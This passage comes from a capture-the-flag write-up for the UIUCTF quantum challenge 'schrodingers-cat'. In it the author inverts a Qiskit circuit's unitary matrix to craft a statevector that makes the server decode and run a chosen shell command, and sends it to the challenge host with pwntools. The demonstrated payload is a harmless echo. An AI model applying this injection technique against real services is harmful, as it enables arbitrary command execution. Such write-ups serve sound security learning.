+</span></span><span style=display:flex><span>qc<span style=color:#f92672>.</span>h(<span style=color:#ae81ff>0</span>)
+</span></span></code></pre></div><p>We get a different error:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>     ┌──────────────┐┌───────────────────────┐
+</span></span><span style=display:flex><span>q_0: ┤0             ├┤0                      ├
+</span></span><span style=display:flex><span>     │              ││                       │
+</span></span><span style=display:flex><span>q_1: ┤1             ├┤1                      ├
+</span></span><span style=display:flex><span>     │              ││                       │
+</span></span><span style=display:flex><span>q_2: ┤2 circuit-298 ├┤2 echo &#39;Hello, world!&#39; ├
+</span></span><span style=display:flex><span>     │              ││                       │
+</span></span><span style=display:flex><span>q_3: ┤3             ├┤3                      ├
+</span></span><span style=display:flex><span>     │              ││                       │
+</span></span><span style=display:flex><span>q_4: ┤4             ├┤4                      ├
+</span></span><span style=display:flex><span>     └──────────────┘└───────────────────────┘
+</span></span><span style=display:flex><span>Your rehydrated statevector isn&#39;t very precise. Try adding at least 6 decimal places of precision, or contact the challenge author if you think this is a mistake.
+</span></span><span style=display:flex><span>[1, 141, -5, 152, -5, 50, -21, 122, 0, 153, 47, 110, -62, 107, -2, 159, 6, 147, -4, 51, 0, 45, 0, 45, 0, 45, 0, 45, 0, 45, 0, 45]
+</span></span></code></pre></div><p>Okay, seems the circuit is very fragile, since even a single gate can cause a huge disruption. Let&rsquo;s try taking a deeper look at how the server actually works, and seeing if there&rsquo;s anything we can use to help us.</p><h2 id=the-state-of-the-vector>The state of the vector</h2><p>Let&rsquo;s try seeing what the value of the statevectors are. We can copy over the server code and use <a href=https://qiskit.org/documentation/apidoc/quantum_info.html#module-qiskit.quantum_info><code>qiskit.qi.Statevector</code></a> to see the result of the circuit:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># normalization, transform, and all imports copied over</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> qiskit.quantum_info <span style=color:#66d9ef>as</span> qi
+</span></span><span style=display:flex><span>server_sv, server_n <span style=color:#f92672>=</span> normalization(<span style=color:#e6db74>&#34;echo &#39;Hello, world!&#39;&#34;</span>) 
+</span></span><span style=display:flex><span>print(server_sv, server_n)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>qc <span style=color:#f92672>=</span> QuantumCircuit(<span style=color:#ae81ff>5</span>)
+</span></span><span style=display:flex><span>qc<span style=color:#f92672>.</span>append(StatePreparation(server_sv), range(<span style=color:#ae81ff>5</span>))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>qc_sv <span style=color:#f92672>=</span> qi<span style=color:#f92672>.</span>Statevector(qc)
+</span></span><span style=display:flex><span>print(qc_sv) <span style=color:#75715e># see how its normalized</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>norm <span style=color:#f92672>=</span> <span style=color:#ae81ff>419.1873089681986</span>
+</span></span><span style=display:flex><span>msg <span style=color:#f92672>=</span> transform(qc_sv, norm) <span style=color:#75715e># convert back to ascii</span>
+</span></span><span style=display:flex><span>print(msg)
+</span></span></code></pre></div><p>We get the same statevector, obviously:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>[0.24094241 0.23617127 0.24809911 0.26479809 0.07633819 0.09303717
+</span></span><span style=display:flex><span> 0.17176093 0.24094241 0.25764139 0.25764139 0.26479809 0.10496501
+</span></span><span style=display:flex><span> 0.07633819 0.28388264 0.26479809 0.2719548  0.25764139 0.23855684
+</span></span><span style=display:flex><span> 0.07872376 0.09303717 0.07633819 0.07633819 0.07633819 0.07633819
+</span></span><span style=display:flex><span> 0.07633819 0.07633819 0.07633819 0.07633819 0.07633819 0.07633819
+</span></span><span style=display:flex><span> 0.07633819 0.07633819] 419.1873089681986 // server_sv, server_n
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Statevector([0.24094241+0.j, 0.23617127+0.j, 0.24809911+0.j,
+</span></span><span style=display:flex><span>             0.26479809+0.j, 0.07633819+0.j, 0.09303717+0.j,
+</span></span><span style=display:flex><span>             0.17176093+0.j, 0.24094241+0.j, 0.25764139+0.j,
+</span></span><span style=display:flex><span>             0.25764139+0.j, 0.26479809+0.j, 0.10496501+0.j,
+</span></span><span style=display:flex><span>             0.07633819+0.j, 0.28388264+0.j, 0.26479809+0.j,
+</span></span><span style=display:flex><span>             0.2719548 +0.j, 0.25764139+0.j, 0.23855684+0.j,
+</span></span><span style=display:flex><span>             0.07872376+0.j, 0.09303717+0.j, 0.07633819+0.j,
+</span></span><span style=display:flex><span>             0.07633819+0.j, 0.07633819+0.j, 0.07633819+0.j,
+</span></span><span style=display:flex><span>             0.07633819+0.j, 0.07633819+0.j, 0.07633819+0.j,
+</span></span><span style=display:flex><span>             0.07633819+0.j, 0.07633819+0.j, 0.07633819+0.j,
+</span></span><span style=display:flex><span>             0.07633819+0.j, 0.07633819+0.j],
+</span></span><span style=display:flex><span>            dims=(2, 2, 2, 2, 2)) // qc_sv
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>echo &#39;Hello, world!&#39; // msg
+</span></span></code></pre></div><p>Just for fun, let&rsquo;s see what would happen if we repeated the same circuit:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>qc <span style=color:#f92672>=</span> QuantumCircuit(<span style=color:#ae81ff>5</span>)
+</span></span><span style=display:flex><span>qc<span style=color:#f92672>.</span>append(StatePreparation(server_sv), range(<span style=color:#ae81ff>5</span>))
+</span></span><span style=display:flex><span>qc<span style=color:#f92672>.</span>append(StatePreparation(server_sv), range(<span style=color:#ae81ff>5</span>)) <span style=color:#75715e># twice</span>
+</span></span></code></pre></div><p>This actually also fails, and returns a completely messed up statevector:</p><pre tabindex=0><code>Statevector([ 0.00310183+0.j, -0.0846333 +0.j, -0.07388225+0.j,
+              0.01665548+0.j,  0.08883431+0.j, -0.00466635+0.j,
+              0.06911396+0.j, -0.13734091+0.j,  0.00989164+0.j,
+              0.08311832+0.j,  0.09896496+0.j, -0.01062691+0.j,
+              0.04029352+0.j, -0.18419004+0.j, -0.0480201 +0.j,
+              0.54101937+0.j,  0.01759582+0.j,  0.20532339+0.j,
+             -0.04013826+0.j,  0.17487327+0.j,  0.04293363+0.j,
+              0.01202631+0.j, -0.00127593+0.j,  0.18412711+0.j,
+              0.00836774+0.j,  0.1099127 +0.j,  0.05956288+0.j,
+              0.08344875+0.j, -0.04055421+0.j,  0.02260543+0.j,
+             -0.01455059+0.j,  0.68737695+0.j],
+            dims=(2, 2, 2, 2, 2)) // qc_sv
+
+Your rehydrated statevector isn&#39;t very precise. Try adding at least 6 decimal places of precision, or contact the challenge author if you think this is a mistake.
+[1, -35, -31, 7, 37, -2, 29, -58, 4, 35, 41, -4, 17, -77, -20, 227, 7, 86, -17, 73, 18, 5, -1, 77, 4, 46, 25, 35, -17, 9, -6, 288]
+</code></pre><p>What about no circuit at all?</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>qc <span style=color:#f92672>=</span> QuantumCircuit(<span style=color:#ae81ff>5</span>)
+</span></span><span style=display:flex><span><span style=color:#75715e># qc.append(StatePreparation(server_sv), range(5))</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>qc_sv <span style=color:#f92672>=</span> qi<span style=color:#f92672>.</span>Statevector(qc)
+</span></span><span style=display:flex><span>print(qc_sv)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>norm <span style=color:#f92672>=</span> <span style=color:#ae81ff>419.1873089681986</span>
+</span></span><span style=display:flex><span>msg <span style=color:#f92672>=</span> transform(qc_sv, norm)
+</span></span><span style=display:flex><span>print(msg)
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>Statevector([1.+0.j, 0.+0.j, 0.+0.j, 0.+0.j, 0.+0.j, 0.+0.j, 0.+0.j,
+</span></span><span style=display:flex><span>             0.+0.j, 0.+0.j, 0.+0.j, 0.+0.j, 0.+0.j, 0.+0.j, 0.+0.j,
+</span></span><span style=display:flex><span>             0.+0.j, 0.+0.j, 0.+0.j, 0.+0.j, 0.+0.j, 0.+0.j, 0.+0.j,
+</span></span><span style=display:flex><span>             0.+0.j, 0.+0.j, 0.+0.j, 0.+0.j, 0.+0.j, 0.+0.j, 0.+0.j,
+</span></span><span style=display:flex><span>             0.+0.j, 0.+0.j, 0.+0.j, 0.+0.j],
+</span></span><span style=display:flex><span>            dims=(2, 2, 2, 2, 2))
+</span></span></code></pre></div><p>We get a statevector of 1 followed by 31 zeroes. This might seem a bit confusing at first, since all the qubits should be in the 0 state, so how is there a 1 in the statevector?</p><p>Well, remember that the statevector doesn&rsquo;t actually record any value of the qubits, it just records the probabilities of the qubits being in some state. In this case, the 1 means theres a 100% chance all 5 qubits are measured to be 0, which makes sense.</p><p>But, while knowing the statevector is nice, this isn&rsquo;t getting us anywhere closer to the solution, so let&rsquo;s try something else.</p><h2 id=mats>Mat🍚s</h2><p>So far we&rsquo;ve been observing the qubits only through the statevector. But why is this? After all, the quantum circuit gates only act on individual qubits, so how can that transformation be represented in the statevector?</p><p>Well, obviously spoiled by the section title, but actually, <em>quantum logic gates are representable as <a href=https://en.wikipedia.org/wiki/Unitary_matrix>unitary matrices</a></em>. A gate that acts on $n$ qubits is represented by a $2^n$ by $2^n$ matrix. For example, here are some gates and their matrix representations (<a href=https://en.wikipedia.org/wiki/Quantum_logic_gate>taken from Wikipedia</a>):</p><p>$$
+X = \begin{bmatrix} 0 & 1 \\ 1 & 0 \end{bmatrix}
+\qquad
+$$</p><p>$$
+H = \frac{1}{\sqrt{2}} \begin{bmatrix} 1 & 1 \\ 1 & -1 \end{bmatrix}
+\qquad
+$$</p><p>To apply a gate to a qubit, we simply multiply the gate matrix with the qubit&rsquo;s statevector. For example, if we have a qubit in the state $|0\rangle$, and we apply the $X$ gate to it, we get:</p><p>$$
+X|0\rangle = \begin{bmatrix} 0 & 1 \\ 1 & 0 \end{bmatrix} \begin{bmatrix} 1 \\ 0 \end{bmatrix} = \begin{bmatrix} 0 \\ 1 \end{bmatrix} = |1\rangle
+$$</p><p>Now, because these matrices are unitary, we can easily find their inverse, and create an inverse gate that does the exact opposite of the original gate. This is actually one of the key properties of quantum circuits, in that their are always reversible, as long as they do not collapse any qubits.</p><p>In addition, multiple gates together just combine into one larger matrix, as matrix multiplication is already a very well defined thing. This means we can take the server&rsquo;s given circuit, and find its matrix representation very easily using <a href=https://qiskit.org/documentation/stubs/qiskit.quantum_info.Operator.html><code>qiskit.quantum_info.Operator</code></a>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>server_sv, server_n <span style=color:#f92672>=</span> normalization(<span style=color:#e6db74>&#34;echo &#39;Hello, world!&#39;&#34;</span>) 
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>qc <span style=color:#f92672>=</span> QuantumCircuit(<span style=color:#ae81ff>5</span>)
+</span></span><span style=display:flex><span>qc<span style=color:#f92672>.</span>append(StatePreparation(server_sv), range(<span style=color:#ae81ff>5</span>))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>mat <span style=color:#f92672>=</span> qi<span style=color:#f92672>.</span>Operator(qc)
+</span></span><span style=display:flex><span>print(mat)
+</span></span></code></pre></div><pre tabindex=0><code>Operator([[ 0.24094241+0.j, -0.23617127+0.j, -0.25913738+0.j, ...,
+            0.08825212+0.j,  0.09683406+0.j, -0.09491655+0.j],
+          [ 0.23617127+0.j,  0.24094241+0.j, -0.25400594+0.j, ...,
+           -0.09003499+0.j,  0.09491655+0.j,  0.09683406+0.j],
+          [ 0.24809911+0.j, -0.26479809+0.j,  0.23067918+0.j, ...,
+            0.09894935+0.j, -0.08619984+0.j,  0.09200176+0.j],
+          ...,
+          [ 0.07633819+0.j,  0.07633819+0.j, -0.07633819+0.j, ...,
+            0.27714851+0.j, -0.27714851+0.j, -0.27714851+0.j],
+          [ 0.07633819+0.j, -0.07633819+0.j,  0.07633819+0.j, ...,
+           -0.27714851+0.j,  0.27714851+0.j, -0.27714851+0.j],
+          [ 0.07633819+0.j,  0.07633819+0.j,  0.07633819+0.j, ...,
+            0.27714851+0.j,  0.27714851+0.j,  0.27714851+0.j]],
+         input_dims=(2, 2, 2, 2, 2), output_dims=(2, 2, 2, 2, 2))
+</code></pre><p>The whole thing is a 32 by 32 matrix. Now, we can do a lot of things with this matrix. For example, let&rsquo;s just confirm that it actually works as intended, by multiplying with the base statevector:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>server_sv, server_n <span style=color:#f92672>=</span> normalization(<span style=color:#e6db74>&#34;echo &#39;Hello, world!&#39;&#34;</span>) 
+</span></span><span style=display:flex><span>qc <span style=color:#f92672>=</span> QuantumCircuit(<span style=color:#ae81ff>5</span>)
+</span></span><span style=display:flex><span>qc<span style=color:#f92672>.</span>append(StatePreparation(server_sv), range(<span style=color:#ae81ff>5</span>))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>mat <span style=color:#f92672>=</span> qi<span style=color:#f92672>.</span>Operator(qc)
+</span></span><span style=display:flex><span>mat <span style=color:#f92672>=</span> np<span style=color:#f92672>.</span>array(mat<span style=color:#f92672>.</span>data)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>base <span style=color:#f92672>=</span> np<span style=color:#f92672>.</span>array([<span style=color:#ae81ff>1</span>] <span style=color:#f92672>+</span> [<span style=color:#ae81ff>0</span>] <span style=color:#f92672>*</span> <span style=color:#ae81ff>31</span>) <span style=color:#75715e># |00000&gt;</span>
+</span></span></code></pre></div><p>To prove that this is the same, normalizing this result gives us back the <code>echo 'Hello, world!'</code> string!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>after <span style=color:#f92672>=</span> mat <span style=color:#f92672>@</span> base
+</span></span><span style=display:flex><span>print(after)
+</span></span><span style=display:flex><span>print(transform(after, server_n))
+</span></span></code></pre></div><pre tabindex=0><code>[0.24094241+0.j 0.23617127+0.j 0.24809911+0.j 0.26479809+0.j
+ 0.07633819+0.j 0.09303717+0.j 0.17176093+0.j 0.24094241+0.j
+ 0.25764139+0.j 0.25764139+0.j 0.26479809+0.j 0.10496501+0.j
+ 0.07633819+0.j 0.28388264+0.j 0.26479809+0.j 0.2719548 +0.j
+ 0.25764139+0.j 0.23855684+0.j 0.07872376+0.j 0.09303717+0.j
+ 0.07633819+0.j 0.07633819+0.j 0.07633819+0.j 0.07633819+0.j
+ 0.07633819+0.j 0.07633819+0.j 0.07633819+0.j 0.07633819+0.j
+ 0.07633819+0.j 0.07633819+0.j 0.07633819+0.j 0.07633819+0.j]
+echo &#39;Hello, world!&#39;
+</code></pre><p>What about the other way around? We can easily invert the matrix, so let&rsquo;s make sure that works too:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>server_sv, server_n <span style=color:#f92672>=</span> normalization(<span style=color:#e6db74>&#34;echo &#39;Hello, world!&#39;&#34;</span>) 
+</span></span><span style=display:flex><span>qc <span style=color:#f92672>=</span> QuantumCircuit(<span style=color:#ae81ff>5</span>)
+</span></span><span style=display:flex><span>qc<span style=color:#f92672>.</span>append(StatePreparation(server_sv), range(<span style=color:#ae81ff>5</span>))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>mat <span style=color:#f92672>=</span> qi<span style=color:#f92672>.</span>Operator(qc)
+</span></span><span style=display:flex><span>mat <span style=color:#f92672>=</span> np<span style=color:#f92672>.</span>array(mat<span style=color:#f92672>.</span>data)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>inv_mat <span style=color:#f92672>=</span> np<span style=color:#f92672>.</span>linalg<span style=color:#f92672>.</span>inv(mat)
+</span></span><span style=display:flex><span>base <span style=color:#f92672>=</span> inv_mat <span style=color:#f92672>@</span> server_sv
+</span></span><span style=display:flex><span>print(base)
+</span></span></code></pre></div><pre tabindex=0><code>[ 1.00000000e+00+0.j -3.33066907e-16+0.j -1.80411242e-16+0.j
+ -2.91433544e-16+0.j -2.77555756e-16+0.j  1.14491749e-16+0.j
+ -1.77809156e-16+0.j -1.04083409e-16+0.j -1.33573708e-16+0.j
+ -7.28583860e-17+0.j  1.38777878e-17+0.j  1.09287579e-16+0.j
+  1.04083409e-16+0.j -1.77809156e-17+0.j -1.56125113e-17+0.j
+  3.46944695e-17+0.j -2.15105711e-16+0.j  2.77555756e-17+0.j
+ -6.24500451e-17+0.j -8.58688121e-17+0.j  1.38777878e-17+0.j
+  3.64291930e-17+0.j  5.94142791e-17+0.j  3.12250226e-17+0.j
+ -2.13370988e-16+0.j -1.04083409e-17+0.j -1.38777878e-17+0.j
+ -1.01481323e-16+0.j -1.04083409e-17+0.j -5.89805982e-17+0.j
+ -5.72458747e-17+0.j -4.51028104e-17+0.j]
+</code></pre><p>Yep, it returns the base statevector we found earlier as well (the other numbers are small enought to be considered 0).</p><p>Now, since we know the matrix represention of the circuit, we can find a target statevector we want the final result to be, multiply by the inverse matrix, and we&rsquo;ll get the statevector we want to end up after our own circuit! Mathematically, we have:</p><p>$$
+\begin{align}
+T &= \text{target statevector} \\
+M &= \text{matrix representation of the circuit} \\
+X &= \text{unknown original statevector} \\
+\newline
+MX &= T \\
+X &= M^{-1} T
+\end{align}
+$$</p><p>To create $T$, we can just use the server&rsquo;s <code>normalization</code> function and use the returned statevector. Then, to find $X$, we just do simple matrix multiplication. Let&rsquo;s try it out!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>server_sv, server_n <span style=color:#f92672>=</span> normalization(<span style=color:#e6db74>&#34;echo &#39;Hello, world!&#39;&#34;</span>) 
+</span></span><span style=display:flex><span>qc <span style=color:#f92672>=</span> QuantumCircuit(<span style=color:#ae81ff>5</span>)
+</span></span><span style=display:flex><span>qc<span style=color:#f92672>.</span>append(StatePreparation(server_sv), range(<span style=color:#ae81ff>5</span>))
+</span></span><span style=display:flex><span>mat <span style=color:#f92672>=</span> qi<span style=color:#f92672>.</span>Operator(qc)
+</span></span><span style=display:flex><span>mat <span style=color:#f92672>=</span> np<span style=color:#f92672>.</span>array(mat<span style=color:#f92672>.</span>data)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>wanted_sv, wanted_n <span style=color:#f92672>=</span> normalization(<span style=color:#e6db74>&#34;echo &#39;PWNED!&#39;&#34;</span>)
+</span></span><span style=display:flex><span>inv_mat <span style=color:#f92672>=</span> np<span style=color:#f92672>.</span>linalg<span style=color:#f92672>.</span>inv(mat)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>X <span style=color:#f92672>=</span> inv_mat <span style=color:#f92672>@</span> wanted_sv
+</span></span><span style=display:flex><span>print(X, np<span style=color:#f92672>.</span>linalg<span style=color:#f92672>.</span>norm(X))
+</span></span></code></pre></div><pre tabindex=0><code>[ 0.9076335 +0.j -0.04412251+0.j  0.01634292+0.j  0.03698722+0.j
+ -0.06906886+0.j -0.04673537+0.j -0.01752824+0.j  0.01427621+0.j
+ -0.20692711+0.j -0.01171279+0.j -0.02737254+0.j  0.05108334+0.j
+ -0.10947422+0.j  0.00239175+0.j  0.01199106+0.j  0.02742216+0.j
+ -0.06468989+0.j  0.02382291+0.j  0.07320342+0.j -0.0310617 +0.j
+  0.15398962+0.j  0.02346015+0.j -0.02452697+0.j -0.0023462 +0.j
+  0.26119513+0.j  0.00535547+0.j -0.02980742+0.j -0.01968094+0.j
+ -0.00760883+0.j -0.00095966+0.j  0.0118614 +0.j -0.01672764+0.j]
+1.0000000000000004 # norm is ~1
+</code></pre><p>Since the norm of $X$ is 1, we know that it&rsquo;s a valid statevector. Then, we can use <a href=https://qiskit.org/documentation/stubs/qiskit.circuit.library.StatePreparation.html><code>qiskit.circuit.library.StatePreparation</code></a>, which is what the server uses to create it&rsquo;s <code>echo 'Hello, world!'</code> circuit, to create our own circuit that initializes the statevector $X$.</p><p>However, we also need to supply a normalization constant to the server. That&rsquo;s what the second output of <code>normalization</code> is for. When we create $T$, the second output of the function will later be used as our normalization constant to transform the statevector back to ASCII.</p><p>From here, we can simulate what the server does, append the <code>echo 'Hello, world!'</code> circuit, then run the entire circuit:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>server_sv, server_n <span style=color:#f92672>=</span> normalization(<span style=color:#e6db74>&#34;echo &#39;Hello, world!&#39;&#34;</span>) 
+</span></span><span style=display:flex><span>qc <span style=color:#f92672>=</span> QuantumCircuit(<span style=color:#ae81ff>5</span>)
+</span></span><span style=display:flex><span>qc<span style=color:#f92672>.</span>append(StatePreparation(server_sv), range(<span style=color:#ae81ff>5</span>))
+</span></span><span style=display:flex><span>M <span style=color:#f92672>=</span> qi<span style=color:#f92672>.</span>Operator(qc)
+</span></span><span style=display:flex><span>M <span style=color:#f92672>=</span> np<span style=color:#f92672>.</span>array(M<span style=color:#f92672>.</span>data)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>T, T_n <span style=color:#f92672>=</span> normalization(<span style=color:#e6db74>&#34;echo &#39;PWNED!&#39;&#34;</span>)
+</span></span><span style=display:flex><span>inv_mat <span style=color:#f92672>=</span> np<span style=color:#f92672>.</span>linalg<span style=color:#f92672>.</span>inv(M)
+</span></span><span style=display:flex><span>X <span style=color:#f92672>=</span> inv_mat <span style=color:#f92672>@</span> T
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>qc <span style=color:#f92672>=</span> QuantumCircuit(<span style=color:#ae81ff>5</span>) <span style=color:#75715e># create a new circuit</span>
+</span></span><span style=display:flex><span>qc<span style=color:#f92672>.</span>append(StatePreparation(X), range(<span style=color:#ae81ff>5</span>))
+</span></span><span style=display:flex><span>qc<span style=color:#f92672>.</span>append(StatePreparation(server_sv), range(<span style=color:#ae81ff>5</span>))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>final_sv <span style=color:#f92672>=</span> qi<span style=color:#f92672>.</span>Statevector(qc)
+</span></span><span style=display:flex><span>print(transform(final_sv, T_n)) <span style=color:#75715e># use T_n, not server_n</span>
+</span></span></code></pre></div><p>And we&rsquo;ve successfully injected our own command!</p><pre tabindex=0><code>echo &#39;PWNED!&#39;
+</code></pre><h2 id=too-open-for-qasm>Too open for QASM</h2><p>Let&rsquo;s add back our remote connection and try and run our exploit now:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>server_sv, server_n <span style=color:#f92672>=</span> normalization(<span style=color:#e6db74>&#34;echo &#39;Hello, world!&#39;&#34;</span>) 
+</span></span><span style=display:flex><span>qc <span style=color:#f92672>=</span> QuantumCircuit(<span style=color:#ae81ff>5</span>)
+</span></span><span style=display:flex><span>qc<span style=color:#f92672>.</span>append(StatePreparation(server_sv), range(<span style=color:#ae81ff>5</span>))
+</span></span><span style=display:flex><span>M <span style=color:#f92672>=</span> qi<span style=color:#f92672>.</span>Operator(qc)
+</span></span><span style=display:flex><span>M <span style=color:#f92672>=</span> np<span style=color:#f92672>.</span>array(M<span style=color:#f92672>.</span>data)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>T, T_n <span style=color:#f92672>=</span> normalization(<span style=color:#e6db74>&#34;echo &#39;PWNED!&#39;&#34;</span>)
+</span></span><span style=display:flex><span>inv_mat <span style=color:#f92672>=</span> np<span style=color:#f92672>.</span>linalg<span style=color:#f92672>.</span>inv(M)
+</span></span><span style=display:flex><span>X <span style=color:#f92672>=</span> inv_mat <span style=color:#f92672>@</span> T
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>qc <span style=color:#f92672>=</span> QuantumCircuit(<span style=color:#ae81ff>5</span>)
+</span></span><span style=display:flex><span>qc<span style=color:#f92672>.</span>append(StatePreparation(X), range(<span style=color:#ae81ff>5</span>))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> base64 <span style=color:#f92672>import</span> b64encode
+</span></span><span style=display:flex><span>qc <span style=color:#f92672>=</span> b64encode(qc<span style=color:#f92672>.</span>qasm()<span style=color:#f92672>.</span>encode())
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> remote
+</span></span><span style=display:flex><span><span style=color:#75715e># nc schrodingers-cat.chal.uiuc.tf 1337</span>
+</span></span><span style=display:flex><span>r <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#34;schrodingers-cat.chal.uiuc.tf&#34;</span>, <span style=color:#ae81ff>1337</span>)
+</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Please type your OpenQASM circuit as a base64 encoded string: &#39;</span>, qc)
+</span></span><span style=display:flex><span>print(r<span style=color:#f92672>.</span>recvline())
+</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;Please enter your normalization constant (precision matters!): &#34;</span>, str(T_n)<span style=color:#f92672>.</span>encode())
+</span></span></code></pre></div><pre tabindex=0><code>b&#39;Error processing OpenQASM file! Try decomposing your circuit into basis gates using `transpile`.\n&#39;
+</code></pre><p>&mldr; what. Why doesn&rsquo;t this work? Well, it turns out that <code>StatePreparation</code> actually puts a ton of higher-level components into the quantum circuit, which QASM doesn&rsquo;t support. We can see this by printing out the QASM of the circuit:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>qc <span style=color:#f92672>=</span> QuantumCircuit(<span style=color:#ae81ff>5</span>)
+</span></span><span style=display:flex><span>qc<span style=color:#f92672>.</span>append(StatePreparation(X), range(<span style=color:#ae81ff>5</span>))
+</span></span><span style=display:flex><span>print(qc<span style=color:#f92672>.</span>qasm())
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>OPENQASM 2.0;
+</span></span><span style=display:flex><span>include &#34;qelib1.inc&#34;;
+</span></span><span style=display:flex><span>gate multiplex2_dg q0,q1 { multiplex1_reverse_dg q0; cx q1,q0; multiplex1_dg q0; }
+</span></span><span style=display:flex><span>gate multiplex3_dg q0,q1,q2 { multiplex2_reverse_dg q0,q1; cx q2,q0; multiplex2_dg q0,q1; }
+</span></span><span style=display:flex><span>gate multiplex1_reverse_reverse_reverse_dg q0 { rz(-5*pi/16) q0; }
+</span></span><span style=display:flex><span>gate multiplex2_reverse_reverse_dg q0,q1 { multiplex1_reverse_reverse_reverse_dg q0; cx q1,q0; multiplex1_reverse_reverse_dg q0; }
+</span></span><span style=display:flex><span>gate multiplex1_reverse_reverse_dg q0 { rz(pi/16) q0; }
+</span></span><span style=display:flex><span>gate multiplex2_reverse_dg q0,q1 { multiplex1_reverse_dg q0; cx q1,q0; multiplex1_reverse_reverse_dg q0; }
+</span></span><span style=display:flex><span>gate multiplex3_reverse_dg q0,q1,q2 { multiplex2_reverse_dg q0,q1; cx q2,q0; multiplex2_reverse_reverse_dg q0,q1; }
+</span></span><span style=display:flex><span>gate multiplex4_dg q0,q1,q2,q3 { multiplex3_reverse_dg q0,q1,q2; cx q3,q0; multiplex3_dg q0,q1,q2; }
+</span></span><span style=display:flex><span>gate multiplex1_reverse_reverse_reverse_reverse_dg q0 { rz(pi/16) q0; }
+</span></span><span style=display:flex><span>gate multiplex1_reverse_reverse_reverse_dg q0 { rz(pi/16) q0; }
+</span></span><span style=display:flex><span>gate multiplex2_reverse_reverse_reverse_dg q0,q1 { multiplex1_reverse_reverse_reverse_dg q0; cx q1,q0; multiplex1_reverse_reverse_reverse_reverse_dg q0; }
+</span></span><span style=display:flex><span>gate multiplex3_reverse_reverse_dg q0,q1,q2 { multiplex2_reverse_reverse_reverse_dg q0,q1; cx q2,q0; multiplex2_reverse_reverse_dg q0,q1; }
+</span></span><span style=display:flex><span>gate multiplex1_reverse_reverse_dg q0 { rz(3*pi/16) q0; }
+</span></span><span style=display:flex><span>gate multiplex1_reverse_reverse_reverse_dg q0 { rz(3*pi/16) q0; }
+</span></span><span style=display:flex><span>gate multiplex2_reverse_reverse_dg q0,q1 { multiplex1_reverse_reverse_reverse_dg q0; cx q1,q0; multiplex1_reverse_reverse_dg q0; }
